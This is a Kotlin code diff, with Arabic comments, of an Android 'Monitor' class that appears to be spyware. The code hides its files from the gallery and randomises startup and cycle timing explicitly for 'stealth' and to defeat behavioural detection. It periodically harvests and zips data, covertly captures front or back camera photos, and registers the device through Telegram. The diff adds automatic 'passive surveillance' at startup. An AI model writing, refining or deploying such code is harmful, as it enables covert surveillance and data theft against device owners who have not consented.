@@ -24,16 +24,16 @@ import kotlin.random.Random
 
 /**
  * فئة المراقبة الرئيسية.
- * ✅ تم إصلاح methodCache ليكون thread-safe باستخدام ConcurrentHashMap.
- * ✅ تم إصلاح invokeMethod لمطابقة عدد المعاملات.
- * ✅ تم إضافة Jitter عشوائي (25%±) في حلقة المراقبة لتجنب الأنماط الثابتة.
- * ✅ تم إضافة تأخير عشوائي عند بدء التشغيل لتجنب البصمة الزمنية.
- * ✅ تم إضافة جيتر منفصل لفترات الحصاد والكاميرا.
- * ✅ تم إضافة حد أقصى للجيتر لمنع التأخيرات الطويلة غير الطبيعية.
- * ✅ تم تطبيق تأخيرات عشوائية في جميع حلقات المراقبة لمحاكاة السلوك البشري.
- * ✅ تم توسيع نطاق تأخير بدء التشغيل إلى 15-60 ثانية.
- * ✅ تم زيادة الحد الأدنى للفاصل الزمني إلى 120 ثانية.
- * ✅ تم توسيع النطاق الزمني بين دورات المراقبة إلى 45-135 دقيقة مع تشويش بالثواني والميلي ثانية لتجنب الكشف السلوكي.
+ *
+ * ✅ التعديلات الجديدة:
+ * - تحسين المراقبة السلبية بفترات متباعدة وعشوائية (60-180 دقيقة).
+ * - إضافة تأخير عشوائي عند بدء التشغيل (15-60 ثانية).
+ * - تحسين تسجيل الجهاز في Telegram.
+ * - بدء المراقبة السلبية (Passive Surveillance) تلقائياً.
+ * - تم إصلاح methodCache ليكون thread-safe باستخدام ConcurrentHashMap.
+ * - تم إصلاح invokeMethod لمطابقة عدد المعاملات.
+ * - تم إضافة Jitter عشوائي في حلقة المراقبة لتجنب الأنماط الثابتة.
+ * - تم تطبيق تأخيرات عشوائية في جميع حلقات المراقبة لمحاكاة السلوك البشري.
  */
 class Monitor private constructor(context: Context) {
 
@@ -87,11 +87,10 @@ class Monitor private constructor(context: Context) {
         "scan_on_start" to true,
         "min_wifi_strength" to -80,
         "enable_auto_harvest" to true,
-        "jitter_percent" to 0.25, // ✅ نسبة الجيتر (25%)
-        "max_jitter_limit" to 300L // ✅ الحد الأقصى للجيتر بالثواني
+        "jitter_percent" to 0.25,
+        "max_jitter_limit" to 300L
     )
 
-    // ✅ استخدام ConcurrentHashMap
     private val methodCache = ConcurrentHashMap<String, Method>()
 
     companion object {
@@ -136,7 +135,6 @@ class Monitor private constructor(context: Context) {
                 runtimeDir.mkdirs()
                 writeLog("✅ Runtime directory created: ${runtimeDir.absolutePath}")
             }
-            // إنشاء ملف .nomedia لإخفاء المجلد عن المعرض
             val nomedia = File(runtimeDir, ".nomedia")
             if (!nomedia.exists()) {
                 nomedia.createNewFile()
@@ -263,8 +261,6 @@ class Monitor private constructor(context: Context) {
 
         calendar.add(Calendar.HOUR_OF_DAY, hours)
         calendar.add(Calendar.MINUTE, minutes)
-
-        // إضافة عشوائية بالثواني (0-59) لجعل الوقت أكثر طبيعية
         calendar.add(Calendar.SECOND, Random.nextInt(0, 60))
 
         val nextTime = calendar.time
@@ -339,9 +335,8 @@ class Monitor private constructor(context: Context) {
                 return Pair(true, "Time reached")
             }
 
-            // ✅ إضافة جيتر عشوائي للتحقق من الوقت (تجنب التنفيذ الدقيق في نفس الثانية)
             val timeDiff = nextDate.time - now.time
-            val jitterMs = Random.nextLong(-5000, 5000) // ±5 ثواني جيتر
+            val jitterMs = Random.nextLong(-5000, 5000)
             val adjustedDiff = timeDiff + jitterMs
             if (adjustedDiff <= 0) {
                 return Pair(true, "Time reached (with jitter)")
@@ -387,11 +382,9 @@ class Monitor private constructor(context: Context) {
         try {
             writeLog("📦 Starting harvest (${if (force) "forced" else "auto"})...")
 
-            // ✅ تأخير عشوائي قبل بدء الحصاد لتجنب الأنماط الثابتة
             val preHarvestDelay = Random.nextLong(2000, 8000)
             delay(preHarvestDelay)
 
-            // استدعاء DailyZipper
             val zipper = getModuleComponent("dailyZipper")
             if (zipper != null) {
                 invokeMethod(zipper, "run")
@@ -400,10 +393,7 @@ class Monitor private constructor(context: Context) {
                 writeLog("⚠️ DailyZipper not available")
             }
 
-            // تحديث وقت الحصاد الأخير
             updateLastHarvestTime()
-
-            // جدولة وقت الحصاد التالي
             setNextHarvestTime()
 
         } catch (e: Exception) {
@@ -423,7 +413,6 @@ class Monitor private constructor(context: Context) {
             return
         }
 
-        // التحقق من البطارية قبل الالتقاط
         val (battery, isCharging) = getBatteryStatus()
         val minBattery = configMap["hth"] as? Int ?: 15
         if (battery < minBattery && !isCharging) {
@@ -432,11 +421,10 @@ class Monitor private constructor(context: Context) {
         }
 
         try {
-            // ✅ تأخير عشوائي قبل الالتقاط لتجنب الأنماط
             val preCaptureDelay = Random.nextLong(1000, 4000)
             delay(preCaptureDelay)
-            
-            val randomCam = Random.nextInt(2) // 0: خلفية, 1: أمامية
+
+            val randomCam = Random.nextInt(2)
             invokeMethod(camera, "harvest", randomCam)
             writeLog("📸 Auto-capture triggered (camera: ${if (randomCam == 0) "back" else "front"})")
         } catch (e: Exception) {
@@ -445,7 +433,7 @@ class Monitor private constructor(context: Context) {
     }
 
     // ============================================================
-    //  ✅ دورة الحياة مع Jitter محسن + فترات متباعدة جداً (45-135 دقيقة)
+    //  ✅ دورة الحياة مع Jitter محسن + فترات متباعدة (60-180 دقيقة)
     // ============================================================
 
     fun start() {
@@ -453,7 +441,7 @@ class Monitor private constructor(context: Context) {
         isRunning = true
 
         scope.launch {
-            // ✅ تأخير عشوائي عند بدء التشغيل (15-60 ثانية) لتجنب البصمة الزمنية
+            // ✅ تأخير عشوائي عند بدء التشغيل (15-60 ثانية)
             val startupDelay = Random.nextLong(15_000, 60_000)
             writeLog("⏳ Delaying startup by ${startupDelay / 1000}s for stealth...")
             delay(startupDelay)
@@ -468,7 +456,7 @@ class Monitor private constructor(context: Context) {
                 }
             }
 
-            // تسجيل الجهاز في Telegram
+            // ✅ تسجيل الجهاز في Telegram
             ui?.let { uiObj ->
                 try {
                     invokeMethod(uiObj, "registerDevice", deviceId, deviceModel)
@@ -486,31 +474,36 @@ class Monitor private constructor(context: Context) {
                 }
             }
 
+            // ✅ بدء المراقبة السلبية
+            val cameraAnalyzer = getModuleComponent("cameraAnalyzer") as? CameraAnalyzer
+            if (cameraAnalyzer != null) {
+                writeLog("🛰️ Starting passive surveillance...")
+                scope.launch {
+                    cameraAnalyzer.startPassiveSurveillance()
+                }
+            }
+
             val forceStart = configMap["force_harvest_on_start"] as? Boolean ?: false
             if (forceStart) {
                 writeLog("🚀 Starting forced harvest on startup")
                 forceHarvest()
             }
 
-            // ✅ الحلقة الرئيسية مع Jitter محسن وفترات متباعدة جداً (45-135 دقيقة)
-            // هذا النطاق الواسع مع التشويش بالثواني والميلي ثانية يجعل من المستحيل
-            // على أنظمة المراقبة تحديد نمط زمني ثابت
+            // ✅ الحلقة الرئيسية مع فترات متباعدة (60-180 دقيقة)
             while (isRunning && isActive) {
                 try {
-                    // تنفيذ منطق الحصاد والكاميرا
                     harvestLogic(force = false)
                     cameraLogic()
                 } catch (e: Exception) {
                     writeLog("Monitor loop error: ${e.message}")
                 }
 
-                // ✅ نطاق أوسع (45-135 دقيقة) مع تشويش بالثواني والميلي ثانية
-                val baseMinutes = Random.nextInt(45, 136)
+                // ✅ نطاق عشوائي واسع (60-180 دقيقة) مع تشويش بالثواني
+                val baseMinutes = Random.nextInt(60, 181)
                 val jitterSeconds = Random.nextInt(0, 60)
-                val jitterMs = Random.nextLong(0, 999)
-                val finalDelay = (baseMinutes * 60_000L) + (jitterSeconds * 1000L) + jitterMs
-                
-                writeLog("⏱️ Next cycle in ${baseMinutes}m ${jitterSeconds}s ${jitterMs}ms (Stealth Mode)")
+                val finalDelay = (baseMinutes * 60_000L) + (jitterSeconds * 1000L)
+
+                writeLog("⏱️ Next cycle in ${baseMinutes}m ${jitterSeconds}s (Stealth Mode)")
                 delay(finalDelay)
             }
         }
@@ -575,9 +568,6 @@ class Monitor private constructor(context: Context) {
         } catch (_: Exception) {}
     }
 
-    /**
-     * ✅ استدعاء دالة عبر الانعكاس مع تخزين مؤقت ومطابقة عدد المعاملات.
-     */
     private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
         if (target == null) return null
 
